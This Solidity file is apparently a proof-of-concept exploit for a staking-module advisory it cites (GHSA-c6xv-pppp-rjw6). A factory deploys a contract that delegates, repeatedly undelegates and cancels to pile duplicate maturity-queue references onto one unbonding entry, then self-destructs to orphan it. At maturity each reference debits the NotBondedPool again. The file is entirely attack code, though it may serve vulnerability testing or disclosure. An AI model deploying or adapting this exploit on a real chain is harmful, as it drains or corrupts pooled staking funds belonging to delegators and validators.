// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./StakingI.sol";

// GHSA-c6xv-pppp-rjw6 amplification: build many non-deduplicated maturity-queue
// references that all point at a single unbonding entry, then self-destruct so
// the entry is orphaned. Each reference re-processes the still-present entry at
// maturity and debits NotBondedPool again without crediting anyone.
contract AmpKillable {
    constructor() payable {}

    function run(
        string calldata validator,
        uint256 amt,
        uint256 n
    ) external {
        STAKING_CONTRACT.delegate(address(this), validator, amt);
        uint256 h = block.number;
        for (uint256 i = 0; i < n; i++) {
            STAKING_CONTRACT.undelegate(address(this), validator, amt);
            STAKING_CONTRACT.cancelUnbondingDelegation(
                address(this),
                validator,
                amt,
                h
            );
        }
        STAKING_CONTRACT.undelegate(address(this), validator, amt);
        selfdestruct(payable(msg.sender));
    }
}

contract AmpFactory {
    address public last;

    function run(
        bytes32 salt,
        string calldata validator,
        uint256 amt,
        uint256 n
    ) external payable {
        AmpKillable k = new AmpKillable{salt: salt, value: msg.value}();
        last = address(k);
        k.run(validator, amt, n);
    }
}
